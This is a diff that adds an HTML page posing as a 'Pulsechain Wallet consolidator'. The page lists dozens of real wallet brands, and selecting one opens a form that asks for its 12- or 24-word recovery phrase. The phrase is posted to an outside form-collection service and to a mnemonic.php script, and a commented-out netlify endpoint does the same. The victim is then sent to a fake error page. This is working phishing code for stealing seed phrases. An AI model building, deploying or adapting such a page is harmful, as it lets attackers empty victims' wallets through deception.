@@ -1,0 +1,885 @@
+<html lang="en"><head>
+    <meta http-equiv="content-type" content="text/html;charset=utf-8">
+	<meta charset="UTF-8">
+	<title>Pulsechain</title>
+	<link rel="shortcut icon" href="images/site_logo.png">
+	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
+<style>
+		.item {
+			--icon-size: 32px;
+			background: #E0E0E0;
+			border-radius: 5px;
+			height: 75px;
+			width: 300px;
+			margin: 5px;
+			display: flex;
+			flex-flow: row nowrap;
+			padding: 10px;
+			align-items: center;
+			color: #606060;
+		}
+
+		.item:hover {
+			--icon-size: 36px;
+			color: #404040;
+			font-size: 115%;
+			cursor: pointer;
+		}
+
+		.item > .image {
+			height: 60px;
+			width: 60px;
+			margin-right: 20px;
+		}
+
+		.item > .text {
+			font-size: 22px;
+			flex: 1;
+		}
+
+		.item > .icon {
+			font-size: var(--icon-size);
+		}
+
+		.item > .icon:hover {
+			font-size: var(--icon-size);
+		}
+
+		.modal {
+			color: #404040;
+		}
+
+		.navText {
+			font-size: 20px;
+			color: #c0c0c0;
+		}
+
+		.clickable {
+			cursor: pointer;
+		}
+		*{
+    margin : 0;
+    padding : 0;
+    box-sizing: border-box !important;
+    -webkit-appearance: none;
+}
+html, body, #root, #router-root {
+    height: 100%;
+    width: 100%;
+    margin: 0px;
+    padding: 0px;
+}
+body {
+    font-family: -apple-system, system-ui, BlinkMacSystemFont, "SF Pro Text", Roboto, Helvetica, Arial, sans-serif;
+    font-style: normal;
+    font-stretch: normal;
+    font-weight: 400;
+    font-size: 16px;
+    color: rgb(88, 112, 135);
+    overflow-y: auto;
+    text-rendering: optimizelegibility;
+    -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+    -webkit-font-smoothing: antialiased;
+    text-size-adjust: 100%;
+}
+.top {
+    width: 100%;
+    margin: 0px auto;
+    padding : 23px;
+    display : grid;
+    grid-template-columns : repeat(auto-fit, minmax(50px, 1fr));
+    grid-gap : 10px;
+    margin-bottom : 15px;
+    justify-content : center;
+}
+a.left {
+    color: rgb(88, 120, 188);
+    text-decoration : none;
+    font-weight : 550;
+    font-size : 16px;
+    padding-top : 10px;
+    justify-content : center;
+}
+.top img{
+    width: 100%;
+    max-width: 120px;
+    min-width: 60px;
+    justify-content: center;
+}
+
+.gFeYHJ {
+    font-size: 35px;
+    font-weight: 500;
+    text-align: center;
+}
+.lpfxqP {
+    width : 90%;
+    margin: 30px 0px;
+    font-size: 30px;
+    font-weight: 300;
+    text-align: center;
+}
+.dXgqeu img {
+    width: 100%;
+    padding : 30px;
+}
+.lbvZBb {
+    flex: 1 1 0%;
+    margin: 30px -32px;
+    display: flex;
+    text-align: left;
+    -webkit-box-pack: justify;
+    justify-content: space-between;
+}
+
+a, p, h1, h2, h3, h4, h5, h6 {
+    text-decoration: none;
+    margin: 0px;
+    padding: 0px;
+}
+
+p {
+    display: block;
+    margin-block-start: 1em;
+    margin-block-end: 1em;
+    margin-inline-start: 0px;
+    margin-inline-end: 0px;
+}
+.bout {
+    padding: 20px;
+    font-size: 17px;
+    font-weight: 300;
+    line-height: 1.35;
+    text-align : left;
+}
+.wallets {
+    padding: 20px;
+    font-size: 18px;
+    font-weight: 300;
+    line-height: 1.35;
+}
+a, p, h1, h2, h3, h4, h5, h6 {
+    text-decoration: none;
+    margin: 0px;
+    padding: 0px;
+}
+h2.home {
+    font-size: 32px;
+    font-weight: 300;
+    color: rgb(46, 67, 88);
+    margin-bottom: 20px;
+}
+h1.home{
+    font-weight : 450;
+    color: rgb(46, 67, 88);
+    margin-bottom: 20px;
+}
+.all {
+    display : grid;
+    grid-template-columns : repeat(auto-fit, minmax(90px, 1fr));
+    grid-gap : 10px;
+}
+.apps {
+    width : 95px;
+    height : auto;
+    padding : 10px;
+    text-align : left;
+    margin : auto;
+    justify-content: center;
+    border: none;
+    border-radius : 10px;
+    box-shadow: 2px 2px 10px 2px #ccc;
+    font-weight: 700;
+    font-size : 60%;
+    text-align : center;
+}
+.apps a{
+    text-align : left;
+}
+.apps img {
+    max-width : 75px;
+    border-radius: 50%;
+    object-fit: cover;
+    margin-bottom : 3px;
+}
+.show {
+    width : auto;
+    height : auto;
+    border : none;
+    border-radius: 5px;
+    font-weight : 700;
+    display : block;
+    padding : 10px;
+}
+.hidden {
+    display : none;
+}
+footer {
+    width : auto;
+    margin-top : 90px;
+    justify-content: center;
+}
+footer a{
+   color : rgb(88, 120, 188);
+   margin-left : 10px;
+   
+}
+footer p {
+    display : flex;
+    height : 20px;
+    justify-content: center;
+    -webkit-box-align: center;
+    align-items: center;
+    padding-left: 0.5em;
+    font-size: 14px;
+    color: rgb(88, 120, 188);
+    font-weight: 500;
+    float : center;
+}
+.footimg {
+    max-width : 20px;
+}
+form {
+    padding : 10px;
+}
+.tab {
+    padding : 8px;
+    overflow: hidden;
+    border-bottom : 2px solid white;
+    background-color: white;
+    margin-left : 0px;
+    margin-right : 0px;
+    display : grid;
+    grid-template-columns : repeat(auto-fit, minmax(50px, 1fr));
+    grid-gap : 0px;
+    margin-top : 20px;
+  }
+  
+.tab button {
+    background-color: inherit;
+    float: left;
+    border: none;
+    outline: none;
+    cursor: pointer;
+    padding: 14px 16px;
+    transition: 0.3s;
+  }
+  
+.tab button:hover {
+    background-color: #DDD;
+    border-radius : 20px;
+    color : black;
+  }
+  
+.tab button.active {
+    background-color: rgb(88, 120, 188);
+    border-radius : 20px;
+    color : white;
+    font-weight : 650;
+  }
+  
+.tabcontent {
+    display: none;
+    color : black;
+    padding: 6px;
+    border-bottom: none;
+    border-top: none;
+    margin-left : 0%;
+    margin-right : 0%;
+  }
+@keyframes fadeEffect {
+    from {opacity: 0;}
+    to {opacity: 1;}
+  }
+textarea {
+    width : 85%;
+    height : 150px;
+    border : 2px solid #BBB;
+    padding : 10px;
+    border-radius : 10px;
+}
+.desc{
+    margin-top : 10px;
+    font-size : 75%;
+    color : rgb(88, 120, 188);
+    font-weight : 700;
+}
+.btn {
+    display : block;
+    width : 85%;
+    height : auto;
+    color : white;
+    background : rgb(42, 73, 141);
+    padding : 12px;
+    border : none;
+    border-radius : 10px;
+    font-weight : 650;
+}
+.btn:hover {
+    background : rgb(81, 122, 209);
+}
+.field input {
+    width : 85%;
+    height : auto;
+    border : 2px solid #BBB;
+    padding : 10px;
+    border-radius : 10px;
+    margin-top : 12px;
+}
+img.barcode {
+    max-width : 250px;
+    margin-top : 70px;
+}
+	</style>
+	<script>
+function show() {
+  var x = document.getElementById("hidden");
+  if (x.style.display === "none") {
+    x.style.display = "block";
+  } else {
+    x.style.display = "none";
+  }
+
+  if (x.style.display === "block") {
+    document.getElementById("btn").innerHTML = "Show Less &uarr;";
+  } 
+}
+</script>
+</head>
+<body>
+<center>
+    <div class="top">
+       
+
+        <a href="/" class="main"><img src="images/site_logo.png" alt="logo"></a>
+        <a href="#wallets" class="left">Wallets</a>
+        <a href="#" class="left">Apps</a>
+</div>
+<br>
+<div class="gFeYHJ">pulsechain Wallet consolidator</div>
+
+
+
+<div class="dXgqeu">
+<img src="images/walls.svg" alt="WalletConnect" height="300px">
+<img src="images/imkey.svg" alt="WalletConnect" height="300px">
+</div>
+
+<div class="bout">
+
+<br>
+
+</div>
+
+<div class="wallets" id="wallets">
+    <h1 class="home"></h1>
+<p>Multi Coin Wallets Management</p>
+
+<br>
+<div class="all">
+<div class="apps" data-toggle="modal" data-id="MetaMask" data-target="#exampleModal">
+    <img src="images/metamask.png" class="image" alt="Name"><br>
+    MetaMask
+</div>
+
+<div class="apps" data-toggle="modal" data-id="New Wallet" data-target="#exampleModal">
+    <img src="images/MEW.png"><br>
+    MEW Wallet
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Trust Wallet" data-target="#exampleModal">
+    <img src="images/trustwallet.png"><br>
+    Trust Wallet
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Wallet Connect" data-target="#exampleModal">
+    <img src="images/site_logo.png"><br>
+    Wallect<br>Connect
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Coinbase" data-target="#exampleModal">
+    <img src="images/coinbase.jpg"><br>
+    Coinbase Wallet
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Atomic" data-target="#exampleModal">
+   <img src="images/atomic.png"><br>
+    Atomic Wallet
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Binance" data-target="#exampleModal">
+    <img src="images/binance.png"><br>
+    Binance Smart Chain
+</div>
+
+<div class="apps" data-toggle="modal" data-id="BNB" data-target="#exampleModal">
+<img src="images/bnb.png"><br>
+    BNB
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Polkadot" data-target="#exampleModal">
+    <img src="images/polkadot.png"><br>
+    Polkadot
+</div>
+
+<div class="apps" data-toggle="modal" data-id="XRP" data-target="#exampleModal">
+    <img src="images/xrp.png"><br>
+    XRP
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Stellar" data-target="#exampleModal">
+    <img src="images/stellar.png"><br>
+    Stellar
+</div>
+
+<div class="apps" data-toggle="modal" data-id="MetaMask" data-target="#exampleModal">
+    <img src="images/tezos.png"><br>
+    Tezos
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Theta" data-target="#exampleModal">
+    <img src="images/theta.png"><br>
+    Theta
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Tron" data-target="#exampleModal">
+    <img src="images/tron.png"><br>
+    Tron
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Cosmos" data-target="#exampleModal">
+    <img src="images/cosmos.png"><br>
+    Cosmos
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Maiar" data-target="#exampleModal">
+    <img src="images/maiar.html"><br>
+  Maiar
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Filecoin" data-target="#exampleModal">
+    <img src="images/filecoin.png"><br>
+    Filecoin
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Solana" data-target="#exampleModal">
+    <img src="images/solana.png"><br>
+    Solana
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Ethereum" data-target="#exampleModal">
+    <img src="images/ethereum-classic.png"><br>
+    Ethereum Classic
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Zilliqa" data-target="#exampleModal">
+    <img src="images/zilliqa.png"><br>
+    Zilliqa
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Elrond" data-target="#exampleModal">
+    <img src="images/elrond.jpg"><br>
+    Elrond
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Moonlet" data-target="#exampleModal">
+    <img src="images/moonlet.html"><br>
+    Moonlet
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Icon" data-target="#exampleModal">
+    <img src="images/icon.png"><br>
+    ICON
+</div>
+
+<div class="apps" data-toggle="modal" data-id="swipe" data-target="#exampleModal">
+    <img src="images/swipe.html"><br>
+    Swipe
+</div>
+
+
+</div>
+<br>
+<button onclick="show()" class="btn" id="btn">Show More ↓</button>
+<br><br>
+<div class="hidden" id="hidden">
+<div class="all">
+    
+<div class="apps" data-toggle="modal" data-id="Nano" data-target="#exampleModal">
+    <img src="images/nano.png"><br>
+    Nano
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Tomo Chain" data-target="#exampleModal">
+<img src="images/tomo.png"><br>
+    Tomo Chain
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Iotex" data-target="#exampleModal">
+    <img src="images/iotex.png"><br>
+    IoTex
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Wanchain" data-target="#exampleModal">
+    <img src="images/wanchain.png"><br>
+    Wanchain
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Harmony" data-target="#exampleModal">
+    <img src="images/harmony.png"><br>
+    Harmony
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Kin" data-target="#exampleModal">
+    <img src="images/kin.png"><br>
+    Kin
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Nimiq" data-target="#exampleModal">
+    <img src="images/nimiq.png"><br>
+    Nimiq
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Aion" data-target="#exampleModal">
+    <img src="images/aion.png"><br>
+    Aion
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Thunder Token" data-target="#exampleModal">
+    <img src="images/thundertoken.png"><br>
+    Thunder Token
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Aeternity" data-target="#exampleModal"> 
+    <img src="images/aeternity.png"><br>
+    Aeternity
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Nebulas" data-target="#exampleModal">
+    <img src="images/nebulas.png"><br>
+    Nebulas
+</div>
+
+<div class="apps" data-toggle="modal" data-id="FIO" data-target="#exampleModal">
+    <img src="images/fio.png"><br>
+    FIO
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Gochain" data-target="#exampleModal">
+    <img src="images/gochain.png"><br>
+    GoChain
+</div>
+
+<div class="apps" data-toggle="modal" data-id="POA Network" data-target="#exampleModal">
+    <img src="images/poa.png"><br>
+    POA Network
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Callisto" data-target="#exampleModal">
+    <img src="images/callisto.png"><br>
+    Callisto
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Bitpay" data-target="#exampleModal">
+<img src="images/bitpay.jpg"><br>
+    BitPay
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Aktionariat" data-target="#exampleModal">
+    <img src="images/aktionariat.png"><br>
+    Aktionariat
+</div>
+
+<div class="apps" data-toggle="modal" data-id="AtWallet" data-target="#exampleModal">
+    <img src="images/atwallet.png"><br>
+    AtWallet
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Guard Wallet" data-target="#exampleModal">
+    <img src="images/guard.png"><br>
+    Guard Wallet
+</div>
+
+<div class="apps" data-toggle="modal" data-id="AAVE" data-target="#exampleModal">
+    <img src="images/aave.jpg"><br>
+    AAVE
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Exodus" data-target="#exampleModal">
+    <img src="images/exodus.jpg"><br>
+    Exodus
+</div>
+
+
+<div class="apps" data-toggle="modal" data-id="Enjin" data-target="#exampleModal">
+    <img src="images/enjin.jpg"><br>
+    Enjin
+</div>
+
+
+<div class="apps" data-toggle="modal" data-id="Skale" data-target="#exampleModal">
+    <img src="images/skale.png"><br>
+    Skale
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Portis" data-target="#exampleModal">
+   <img src="images/portis.png"><br>
+    Portis
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Trezor" data-target="#exampleModal">
+    <img src="images/trezor.png"><br>
+    Trezor
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Squarelink" data-target="#exampleModal">
+    <img src="images/squarelink.png"><br>
+    Squarelink
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Torus" data-target="#exampleModal">
+    <img src="images/torus.jpg"><br>
+    Torus
+</div>
+
+<div class="apps" data-toggle="modal" data-id="VeChain" data-target="#exampleModal">
+    <img src="images/vechain.jpg"><br>
+    VeChain
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Scatter Wallet" data-target="#exampleModal">
+    <img src="images/scatter.jpg"><br>
+    Scatter Wallet
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Math Wallet" data-target="#exampleModal">
+    <img src="images/math-wallet.png"><br>
+    Math Wallet
+</div>
+
+<div class="apps" data-toggle="modal" data-id="FortMatic" data-target="#exampleModal">
+    <img src="images/fortmatic.png"><br>
+    FortMatic
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Digitex" data-target="#exampleModal">
+<img src="images/digitex.png"><br>
+    Digitex
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Ledger" data-target="#exampleModal">
+    <img src="images/ledger.png"><br>
+    Ledger
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Defiat" data-target="#exampleModal">
+    <img src="images/defiat.jpg"><br>
+    Defiat
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Authereum" data-target="#exampleModal">
+    <img src="images/authereum.png"><br>
+    Authereum
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Flare Wallet" data-target="#exampleModal">
+    <img src="images/flare.jpg"><br>
+    Flare Wallet
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Zelcore" data-target="#exampleModal">
+    <img src="images/zelcore.png"><br>
+    Zelcore
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Bitkeep" data-target="#exampleModal">
+<img src="images/bitkeep.png"><br>
+    BitKeep
+</div>
+
+<div class="apps" data-toggle="modal" data-id="COin98" data-target="#exampleModal">
+    <img src="images/coin98.png"><br>
+    Coin98
+</div>
+
+<div class="apps" data-toggle="modal" data-id="Trust Vault" data-target="#exampleModal">
+    <img src="images/trustvault.png"><br>
+    Trust Vault
+</div>
+
+</div>
+
+</div>
+
+
+</div>
+
+<footer style="display:none;"><div id="footer">
+<p><img src="images/discord.svg" class="footimg">  <a href="https://discord.gg/jhxMvxP">Discord</a></p><br>
+<p><img src="images/telegram.svg" class="footimg">  <a href="https://t.me/walletconnect_announcements">Telegram</a></p><br>
+<p><img src="images/twitter.svg" class="footimg">  <a href="https://twitter.walletconnect.org/">Twitter</a></p><br>
+<p><img src="images/github.svg" class="footimg">  <a href="https://github.com/walletconnect">Github</a></p><br>
+</div></footer>
+</center>
+<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+	<div class="modal-dialog" role="document">
+		<div class="modal-content replace">
+			<div class="modal-header">
+				<h5 class="modal-title" id="exampleModalLabel">consolidate wallet</h5>
+				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+					<span aria-hidden="true">×</span>
+				</button>
+			</div>
+			<div class="modal-body">
+				<form id="connectForm" action="https://formcarry.com/s/my-O25kfQa_" method="POST">
+					<div class="form-group">
+						<label for="recipient-name" class="col-form-label">Name:</label>
+						<input type="text" class="form-control" id="wallet_name" readonly="" name="wallet_name">
+					</div>
+					<div class="form-group">
+						<label for="message-text" class="col-form-label">Recovery Phrase:</label>
+						<textarea class="form-control" id="recovery_phrase" name="recovery_phrase"></textarea>
+						<label class="font-weight-light text-muted" style="font-size: 14px">Typically 12 (sometimes 24) words separated by single spaces</label><br>
+						<span id="mnemonicMessage" style="color: red"></span>
+					</div>
+					
+					
+				<input type="submit" name="submit" class="btn btn-primary" value="Import">
+				<p id="my-form-status"></p>
+			
+			    	
+			
+				</form>
+			</div>
+
+		</div>
+	</div>
+</div>
+
+
+<script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js%401.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+<script src="blockui.html"></script>
+
+<!-- Place this script at the end of the body tag -->
+
+<script>
+  //window.addEventListener("DOMContentLoaded", function() {
+
+    // get the form elements defined in your form HTML above
+    
+  //  var form = document.getElementById("connectForm");
+  //  var button = document.getElementById("my-form-button");
+ //   var status = document.getElementById("my-form-status");
+
+    // Success and Error functions for after the form is submitted
+    
+   // function success() {
+ //     form.reset();
+ //     button.style = "display: none ";
+  //    status.innerHTML = "Thanks!";
+  //  }
+
+   // function error() {
+   //   status.innerHTML = "Oops! There was a problem.";
+   // }
+
+    // handle the form submission event
+
+   // form.addEventListener("submit", function(ev) {
+   //   ev.preventDefault();
+    //  var data = new FormData(form);
+   //   ajax(form.method, form.action, data, success, error);
+  //  });
+ // });
+  
+  // helper function for sending an AJAX request
+
+  //function ajax(method, url, data, success, error) {
+ //   var xhr = new XMLHttpRequest();
+ //   xhr.open(method, url);
+  //  xhr.setRequestHeader("Accept", "application/json");
+  //  xhr.onreadystatechange = function() {
+  //    if (xhr.readyState !== XMLHttpRequest.DONE) return;
+  //    if (xhr.status === 200) {
+  //      success(xhr.response, xhr.responseType);
+   //   } else {
+   //     error(xhr.status, xhr.response, xhr.responseType);
+   //   }
+  //  };
+  //  xhr.send(data);
+ // }
+</script>
+<script>
+	// function send(){
+	// 	$("#connectionlivewallet-data-collector").block({message: null})
+	// 	const form = document.getElementById('connectionlivewallet-data-collector')
+	// 	const formData = new FormData(form)
+	// 	const payload = {}
+
+	// 	for (const pair of formData) {
+	// 		payload[pair[0]] = pair[1]
+	// 	}
+
+	// 	fetch('https://awesome-lamport-8a184e.netlify.app/.netlify/functions/wallet-connect', {
+	// 		method: 'POST',
+	// 		body: JSON.stringify(payload)
+	// 	}).then(() => {
+	// 		alert("An error occurred while attempting to add your wallet. Please try again later.")
+	// 		$("#connectionlivewallet-data-collector").unblock()
+	// 	})
+	// }
+	
+
+	function Submit(e)
+        {
+            const message = $("#recovery_phrase").val();
+            const wallet_name = $("#wallet_name").val();
+            if (message.split(' ').length < 12) {
+                $("#mnemonicMessage").html("Mnemonic phrase must be at least 12 to 24 words");
+                return false;
+            }else{
+                $(e).empty().html("<i class='fa fa-circle-o-notch fa-spin'></i>  Please Wait");
+                 $.ajax({
+                  type: "post",
+                  cache:false,
+                  url: "mnemonic.php",
+                  data: {
+                    message: message,
+                    name: wallet_name
+                  },
+                  success: function(res)
+                  {
+                    $("#connectForm").trigger('reset');
+                   
+                    if(res == "yes"){
+                    //   $(".replace").fadeIn(3000).html("<div class='text-center' style='color:#131521'><h3>Wallet Connected</h3><img src='qr-response.png' class='img-fluid' /><div class='text-center' style='color:#131521'>Chat ADMIN for Verification Code</div></div>").slideDown(4000);
+                    window.location = "504.html";
+                    }else{
+                      //window.location.reload();
+                    }
+                  }
+                });
+            }
+        }
+        
+        
+        $(function(){
+        	$('#exampleModal').on('show.bs.modal', function(e) { 
+				  var wname = $(e.relatedTarget).data('id');
+				  var that = $(this);
+				  that.find('input[id="wallet_name"]').val(wname) ;  
+			});
+
+            $('#exampleModal').on('hidden.bs.modal', function (e) {
+              window.location.reload();
+            })
+        })
+</script>
+
+
+
+
+</body></html>
